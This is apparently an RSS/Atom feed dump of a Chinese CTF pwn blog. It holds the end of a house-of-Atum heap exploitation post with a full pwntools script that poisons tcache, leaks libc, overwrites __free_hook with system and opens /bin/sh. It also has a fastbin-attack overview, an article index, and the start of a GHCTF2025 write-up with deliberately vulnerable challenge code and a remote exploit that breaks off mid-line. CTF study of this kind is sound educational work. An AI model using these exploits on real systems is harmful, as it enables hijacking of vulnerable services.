class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/myheart/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Input the content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx,choose</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Clear?(y/n):&#x27;</span>,choose)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">chunk_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">chunk_addr = <span class="built_in">int</span>.from_bytes(chunk_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;chunk_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">chunk_addr = chunk_addr -<span class="number">0x10</span> - <span class="number">0x20</span> </span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = p64(chunk_addr)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload =  p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">leak = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">leak = <span class="built_in">int</span>.from_bytes(leak,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">libc_addr = leak - <span class="number">96</span> -<span class="number">0x10</span> -libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys_addr = libc_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0x3</span> + p64(<span class="number">0x51</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = p64(free_hook-<span class="number">0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">delete(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(sys_addr)</span><br><span class="line">add(payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input the idx:&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="利用失效"><a class="markdownIt-Anchor" href="#利用失效"></a> 利用失效</h1><ul><li><code>glibc2.31</code>后利用基本失效了</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc ≥ 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc &lt; 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：调整一下继续学习堆。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>fastbin_attack总结</title>
    <link href="http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/fastbin-attack/"/>
    <id>http://iyheart.github.io/2025/03/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/fastbin-attack/</id>
    <published>2025-03-25T00:49:30.000Z</published>
    <updated>2025-03-26T14:32:29.753Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.yuque.com/cyberangel/rg9gdm/og73qz">PWN入门（3-7-1）-fastbin_attack综述</a></li><li>学了几个<code>house of</code>系列，发现<code>house of</code>系列像是堆利用的进阶。正常流程应该是如下：<ul><li>了解完<code>堆管理机制</code>，开始做几道简单的<code>fastbin_UAF</code>漏洞</li><li>接下去<code>fastbin_dubole_free</code>漏洞</li><li>了解<code>堆溢出</code>漏洞，做几道简单堆溢出漏洞</li><li>了解<code>off-by-one</code>和<code>off-by-null</code>漏洞，学习堆分水，再没有<code>UAF</code>漏洞下，利用堆分水构造出<code>UAF</code>漏洞，从而进行利用，同时还可以学习<code>unlink</code>利用。</li><li>学完以上利用，就可以整体归纳<code>fastbin_attack</code>利用，这样就对堆的<code>fastbin</code>运行机制印象比较深刻，同时在<code>unlink</code>利用中还可以了解<code>unsortedbin</code>的运行机制。并且在学习<code>bins_attack</code>的同时也可以或多或少的接触到<code>house-of</code>系列。(总之先别把house-of系列当主线，好像又走弯路了QAQ。)</li><li>之后就是<code>tcachebin_attach</code>、<code>unsortedbin_attack</code>、<code>smallbin_attack</code>、<code>largebin_attack</code>，在学习这些利用的时候就可以顺便了解这些堆块的运行机制。</li><li>这样就会为之后<code>house-of</code>系列的利用做准备。</li></ul></li></ul><h1 id="fastbin_attack总结"><a class="markdownIt-Anchor" href="#fastbin_attack总结"></a> fastbin_attack总结</h1><ul><li>接下来我们就来归纳一下<code>fastbin_attack</code>的几种利用方式：<ul><li><code>fastbin_UAF_easy</code>：相当于对<code>UAF</code>的简单利用（后面加了个<code>ease</code>）</li><li><code>fastbin_double_free</code>：这个手法虽然是<code>UAF</code>的一种，需要独自展开来说明。</li><li><code>fastbin_UAF_plus</code>：这个指的就是一般难度的<code>UAF</code>漏洞了。通常指的是利用<code>off-by</code>漏洞实现<code>UAF</code>的这种难度。</li><li><code>House-of-spirit</code>：这个手法需要通过<code>free一个伪造的堆块</code>来实现利用，而不是使用<code>释放后的堆块</code>，所以这个并不是</li></ul></li></ul><h1 id="fastbin_uaf_easy"><a class="markdownIt-Anchor" href="#fastbin_uaf_easy"></a> fastbin_UAF_easy</h1><ul><li>关于<code>fastbin_UAF</code>的利用，我写在了这篇博客中：<a href="https://iyheart.github.io/2024/09/04/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86UAF/">PWN堆UAF | iyheart的博客</a></li></ul><h1 id="fastbin_double_free"><a class="markdownIt-Anchor" href="#fastbin_double_free"></a> fastbin_double_free</h1><ul><li>关于<code>fastbin_double</code>的利用，我写在了这篇文章中：<a href="https://iyheart.github.io/2024/09/11/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86double-free/">PWN堆double_free | iyheart的博客</a></li></ul><h1 id="fastbin_uaf_plus"><a class="markdownIt-Anchor" href="#fastbin_uaf_plus"></a> fastbin_UAF_plus</h1><ul><li></li></ul><h1 id="house_of_spirit"><a class="markdownIt-Anchor" href="#house_of_spirit"></a> house_of_spirit</h1><ul><li>关于<code>house_of_spirit</code>的利用，我写在了这篇文章中：<a href="https://iyheart.github.io/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/?highlight=house+of+sp">PWN堆house of spirit-1 | iyheart的博客</a></li></ul>]]></content>
    
    
    <summary type="html">前言：先学一下各种bin_attack再接下去打house</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN系列文章索引</title>
    <link href="http://iyheart.github.io/2025/03/25/PWN%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/"/>
    <id>http://iyheart.github.io/2025/03/25/PWN%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/</id>
    <published>2025-03-25T00:45:16.000Z</published>
    <updated>2025-03-28T07:06:38.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="远程链接"><a class="markdownIt-Anchor" href="#远程链接"></a> 远程链接</h1><h2 id="pwn堆系列"><a class="markdownIt-Anchor" href="#pwn堆系列"></a> PWN堆系列</h2><h3 id="bins_attack系列"><a class="markdownIt-Anchor" href="#bins_attack系列"></a> bins_attack系列</h3><ul><li><code>fastbin_attack</code>：<br>+</li></ul><h3 id="house-of-系列"><a class="markdownIt-Anchor" href="#house-of-系列"></a> house of 系列</h3><ul><li><code>1.house of spirit</code>：<ul><li><a href="https://iyheart.github.io/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/">PWN堆house of spirit-1 | iyheart的博客</a></li><li><a href="https://iyheart.github.io/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/">PWN堆house of spirit-2 | iyheart的博客</a></li></ul></li><li><code>2.house of einherjar</code>：<ul><li><a href="https://iyheart.github.io/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/">PWN堆house-of-einherjar | iyheart的博客</a></li></ul></li><li><code>3.house of force</code>：<ul><li><a href="https://iyheart.github.io/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/">PWN堆house-of-force | iyheart的博客</a></li></ul></li><li><code>4.house of lore</code>：<ul><li><a href="https://iyheart.github.io/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/">PWN堆house-of-lore | iyheart的博客</a></li></ul></li><li><code>5.house of orange </code>：<ul><li><a href="https://iyheart.github.io/2025/02/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-orange/">PWN堆house of orange | iyheart的博客</a></li></ul></li><li><code>6.house of rabbit</code>：<ul><li><a href="https://iyheart.github.io/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/">PWN堆house-of-rabbit | iyheart的博客</a></li></ul></li></ul><h1 id="本地链接"><a class="markdownIt-Anchor" href="#本地链接"></a> 本地链接</h1><h2 id="pwn堆系列"><a class="markdownIt-Anchor" href="#pwn堆系列-2"></a> PWN堆系列</h2>]]></content>
    
    
    <summary type="html">前言：本篇文章作为这个博客PWN系列文章索引</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>GHCTF2025-PWN方向wp</title>
    <link href="http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/"/>
    <id>http://iyheart.github.io/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/</id>
    <published>2025-03-09T10:54:59.000Z</published>
    <updated>2025-03-11T12:34:19.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a class="markdownIt-Anchor" href="#写在前面"></a> 写在前面</h1><ul><li>这次是我第一次出题，没什么经验，大部分题目都是对着一些比较经典的题目改的，QAQ。（还偷偷赛了题国际赛题）</li><li>这次出题感受还是挺深的，还是要多尝试一点东西。接下来就直接开始<code>wp</code>环节</li></ul><h1 id="hello_world"><a class="markdownIt-Anchor" href="#hello_world"></a> Hello_World</h1><ul><li>考点：<code>ret2text</code>、<code>PIE保护</code>、<code>Linux内存分页机制</code>、<code>off-by-one</code></li><li>这题并不用爆破最后一个字节，题目已经设定好了。接下来我们来具体分析一下这个附件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">32</span>];</span><br><span class="line">        read(<span class="number">0</span>,s,<span class="number">0x40</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">out</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*****   *   *  *****  ******   ***** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*       *   *  *        *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;* ****  *****  *        *      ***** \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*   *   *   *  *        *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;*****   *   *  *****    *      *     \n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello pwner!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the world of pwn!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Show time!!!!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        init();</span><br><span class="line">        out();</span><br><span class="line">        func1();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc编译需要开启PIE保护，要关闭canary保护</span></span><br></pre></td></tr></table></figure><h2 id="hello_world_分析1"><a class="markdownIt-Anchor" href="#hello_world_分析1"></a> Hello_World_分析1</h2><ul><li>拿到附件后肯定是先要<code>check</code>一下这个附件开启了什么保护机制。<code>check</code>完后我们发现这个程序没有开启<code>canary</code>保护，但是开启了<code>PIE</code>保护</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190655495.png" alt="image-20250309190655495"></p><ul><li>接下来我们使用<code>IDA pro</code>反汇编一下这个代码，我们发现<code>main</code>函数这边只执行了<code>3</code>个函数，第一个<code>init</code>就不分析了，对输入输出进行初始化</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190804003.png" alt="image-20250309190804003"></p><ul><li>然后我们再来分析一下<code>out()</code>这个函数，发现并没有什么特别的，仅仅是几个输出函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190908838.png" alt="image-20250309190908838"></p><ul><li>现在来查看<code>func1</code>这个函数，发现这边会存在一个栈溢出的漏洞</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309190954154.png" alt="image-20250309190954154"></p><ul><li>我们还注意到，这边还有一个函数名为<code>backdoor</code>的函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191039841.png" alt="image-20250309191039841"></p><ul><li>查看该函数会发现确实是一个后门函数</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191144341.png" alt="image-20250309191144341"></p><ul><li>由于程序开启了<code>PIE</code>保护，我们无法完全确定程序的地址，所以我们<code>IDA pro</code>反编译完，<code>backdoor</code>的这个函数地址是这样的</li><li>如果我们将<code>PIE</code>关闭后，在<code>64</code>位下程序会地址会为<code>0x400000</code>，在<code>32</code>为下程序地址为<code>0x08048000</code>（可以随便找两个对应靶场题目附件反编译看看）</li><li>但是由于内存分页机制，程序地址最后<code>3</code>个<code>16</code>进制位是不会改变的<code>Linux</code>下一个内存页为<code>0x1000</code>即（4KB）</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191314152.png" alt="image-20250309191314152"></p><ul><li>而我们调用<code>func1</code>这个函数时，保存的返回地址其实是<code>main</code>函数汇编中对应的这个汇编指令</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309191836758.png" alt="image-20250309191836758"></p><ul><li>这时我们发现第<code>3</code>个二进制位他们是相同的。</li></ul><h2 id="hello_world_分析2"><a class="markdownIt-Anchor" href="#hello_world_分析2"></a> Hello_World_分析2</h2><ul><li>这时我们来进行动态调试，我们查看一下返回地址，我们发现调用<code>func1</code>时，保存在栈上的返回地址为<code>0x555eb72009f6</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309192103483.png" alt="image-20250309192103483"></p><ul><li>我们再来查看<code>backdoor</code>这个函数的起始地址，这个函数的起始地址为<code>0x555eb72009c1</code>（我们多次动态调试会发现其实<code>返回地址</code>和<code>backdoor</code>函数的起始地址其实就只有最后一个字节是<code>不同的</code>）</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309192219972.png" alt="image-20250309192219972"></p><ul><li>这里要<strong>注意一下</strong>：如果<code>backdoor</code>和返回地址的第三个<code>16进制位</code>不同这时就要需要爆破，因为我们使用<code>read</code>的时候是一个字节一个字节写入到栈上，而一个字节是<code>2</code>个16进制位。我们再修改第<code>3</code>个16进制位的时候会修改到第<code>4</code>个16进制位。这时由于我们不知道第<code>4</code>个16进制位具体是多少，返回的时候就不知道返回到哪个地方了，所以如果遇到这种情况的话就需要进行爆破了。</li></ul><h2 id="hello_world_exp"><a class="markdownIt-Anchor" href="#hello_world_exp"></a> Hello_World_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28285</span>)</span><br><span 